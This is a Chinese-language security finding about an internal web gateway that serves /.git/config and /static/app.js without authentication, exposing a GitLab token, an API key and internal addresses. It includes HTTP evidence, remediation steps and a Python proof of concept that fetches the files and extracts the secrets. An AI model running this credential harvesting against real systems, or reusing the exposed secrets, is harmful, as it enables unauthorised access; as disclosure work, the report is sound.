# 未授权静态文件泄露 GitLab 访问令牌与内部配置（/.git/config 与 /static/app.js）

**ID:** vuln-0009
**Severity:** LOW
**Found:** 2026-10-31 07:52:21 UTC
**Target:** http://10.0.93.73:18080/
**Endpoint:** /.git/config
**Method:** GET
**CWE:** CWE-538
**CVSS:** 3.7
**Confidence:** High
**Fix Effort:** Low

## Description

网关的 Web 根目录下可直接下载 `/.git/config` 与 `/static/app.js`，两者均未做访问控制。前者包含带内嵌凭据的 Git 远程地址（GitLab personal access token `glpat-...` 以 `oauth2:<token>@` 形式写在 `url` 与 `pushurl` 中），后者硬编码了同一令牌作为 `API_KEY`，并包含 Sentry DSN 与内部 API 网关地址。凭据被写入对外可读的静态文件，属部署层面的敏感信息暴露。

## Evidence

未认证读取 `/.git/config`（HTTP 200，11,095 字节）：

```http
GET /.git/config HTTP/1.1
Host: 10.0.93.73:18080

HTTP/1.1 200 OK
Content-Type: text/plain

[core]
    repositoryformatversion = 0
    filemode = true
    bare = false
    logallrefupdates = true
    hooksPath = .githooks
[remote "origin"]
    url = https://oauth2:glpat~RRRRRRRRRRRRRRRRRRRRRRRR@git.nexus.internal/devops/nexus-deploy.git
    fetch = +refs/heads/*:refs/remotes/origin/*
    pushurl = https://oauth2:glpat~RRRRRRRRRRRRRRRRRRRRRRRR@git.nexus.internal/devops/nexus-deploy.git
[remote "upstream"]
    url = https://git.nexus.internal/platform/nexus-deploy-mirror.git
[branch "main"]
    remote = origin
    merge = refs/heads/main
    rebase = true
[credential]
    helper = store
    helper = cache --timeout=3600
[user]
    name = deploy-bot
    email = deploy-bot@nexus.internal
```

未认证读取 `/static/app.js`（HTTP 200），其中硬编码同一令牌与其它内部信息：

```javascript
const CONFIG = {
  API_BASE: 'https://api.nexus.internal/v2',
  API_KEY: 'jge9t357v5lz7e1bylckqano',   // TODO: rotate before GA - tracked in NEX-4481
  SENTRY_DSN: 'https://81d186ac3be2183251d3cb5605b91b88@o113870.ingest.sentry.io/61590',
  GATEWAY_INTERNAL: 'http://10.99.0.1:8081',
  CONSOLE_ORIGIN: 'https://console.nexus.internal'
};
```

真实浏览器在跨源页面中同样读取成功（`/.git/config` 返回 11,193 字节、`app.js` 返回 1,288 字节），说明该暴露不依赖特定客户端：`GET /.git/config` 与 `GET /static/app.js` 均无认证、无 Cookie 依赖。

令牌权限验证尝试：`git.nexus.internal` 解析到 198.18.0.231，TCP/443 可连但 TLS 无响应（curl exit 52），因此无法确认该 PAT 的实际读写范围。

## Impact

未认证攻击者可获取一个 GitLab personal access token（写入 `devops/nexus-deploy.git` 的 `url` 与 `pushurl`，具备该仓库读写能力的形态）、同一令牌对应的前端 `API_KEY`、Sentry DSN 与内部 API 网关地址（`10.99.0.1:8081`）。若该令牌有效，则可读取甚至推送部署仓库，进而影响生产发布流程；即使令牌已失效，泄露的仓库结构、机器人账号（`deploy-bot@nexus.internal`）与内部主机名也可直接用于后续钓鱼与横向探测。本次未能验证令牌权限（内部 GitLab 不可达）。

## Counterevidence

可能的反驳是该令牌为占位值：它与 `/static/app.js` 中的 `API_KEY` 完全同值，且 `git.nexus.internal` 解析到合成地址 198.18.0.231、TLS 无响应，无法证明其可读或可写任何仓库。因此本报告只主张"未认证可取到 Web 根目录下的凭据材料与内部拓扑"这一已证实事实，不主张已获得源代码控制权限；AC 设为 H 正是反映该利用前提未达成。另一方面，文件的公开可读性不依赖任何前置条件，`/.git/config` 与 `/static/app.js` 均直接返回 200，且与 /api/files 路径穿越、CORS 反射是不同根因（本项即使修复路径穿越与 CORS 仍会存在），因此单独上报。

## Confidence Rationale

未认证读取 `/.git/config` 与 `/static/app.js` 已在多个独立请求与真实浏览器跨源读取中稳定复现，令牌内容逐字可比对。仅令牌的实际权限未验证（内部 GitLab 主机不可达），故影响按已证明的凭据泄露定级。

## What Would Change This Severity

若验证该 GitLab 令牌在其可达环境中确实有效并具备 `devops/nexus-deploy.git` 的写权限（可推送代码到部署仓库），应上调至 High/Critical；若确认令牌已吊销且仅为占位值，可维持 Low。

## Technical Analysis

部署把版本控制元数据与前端配置一起发布到了 Web 根目录：

1. `/.git/config` 可直接以 `text/plain` 下载。该文件包含 `[remote "origin"]` 与 `[remote "upstream"]` 两段远程定义，其中 `url` 与 `pushurl` 使用 `https://oauth2:<token>@git.nexus.internal/...` 的嵌入式凭据形式，等价于把 GitLab personal access token 以明文写入可被任意匿名访问者读取的文件。`[credential] helper = store` 进一步说明该环境习惯把凭据落盘保存。
2. `/static/app.js` 为前端配置模块，把同一令牌硬编码为 `API_KEY`，并由 `TODO: rotate before GA - tracked in NEX-4481` 注释确认这是尚未轮换的临时密钥；同一文件还包含 Sentry DSN 与内部 API 网关 `http://10.99.0.1:8081`。

两者都不经过任何认证中间件：请求不带 Cookie 也返回 200，响应体稳定，且与 `/api/files` 路径穿越、CORS 反射配置错误无关——即使修复了那两项，直接请求静态路径仍会泄露同样的内容，因此根因是发布流程把凭据写入了对外可读的静态文件。

## Proof of Concept

1. 直接请求 `/.git/config`，无需任何认证或 Cookie，响应 200 且返回完整 Git 配置。
2. 从 `[remote "origin"]` 的 `url` 与 `pushurl` 中提取 `oauth2:<token>@` 形式的 GitLab personal access token。
3. 请求 `/static/app.js`，确认同一令牌被硬编码为 `API_KEY`，并读取同一文件中的 Sentry DSN 与内部网关地址。
4. 将令牌与仓库地址作为进一步横向的输入（本次因 `git.nexus.internal` 不可达未验证权限）。

```python
import re
import requests

BASE = "http://10.0.93.73:18080"

git_cfg = requests.get(BASE + "/.git/config", timeout=15)
print("[+] /.git/config ->", git_cfg.status_code, len(git_cfg.content), "bytes")
token = re.search(r"oauth2:([A-Za-z0-9_\-]+)@", git_cfg.text)
print("[+] embedded token:", token.group(1) if token else "not found")
for line in git_cfg.text.splitlines():
    if "url =" in line:
        print("    ", line.strip())

app_js = requests.get(BASE + "/static/app.js", timeout=15)
print("[+] /static/app.js ->", app_js.status_code, len(app_js.content), "bytes")
for key in ("API_KEY", "SENTRY_DSN", "GATEWAY_INTERNAL", "CONSOLE_ORIGIN"):
    m = re.search(key + r"\s*:\s*'([^']+)'", app_js.text)
    print("    ", key, "=", m.group(1) if m else "not found")
```

## Remediation

1. 立即轮换 `/.git/config` 与 `/static/app.js` 中出现的 GitLab personal access token，并核查该令牌此前的使用记录。
2. 从部署产物中移除 `.git` 目录与任何前端配置中的凭据；前端只应包含公开的、按最小权限签发的短期凭据。
3. 在 Web 服务器/网关层显式拒绝 `/.git/`、`/.svn/`、`/.hg/` 与备份文件访问（返回 404 而非 403）。
4. 将构建期注入的密钥改为服务端持有，通过后端代理调用上游 API，避免把 `API_KEY` 下发到浏览器。
5. 在 CI 中加入密钥扫描（如 gitleaks/trufflehog）与发布产物清单检查，阻止凭据进入静态文件。

## Assumptions

攻击者只需能访问 `10.0.93.73:18080`，无需认证。令牌为 GitLab personal access token 格式；其实际权限无法验证，因为 `git.nexus.internal` 解析到 198.18.0.231 且 TLS 无响应。
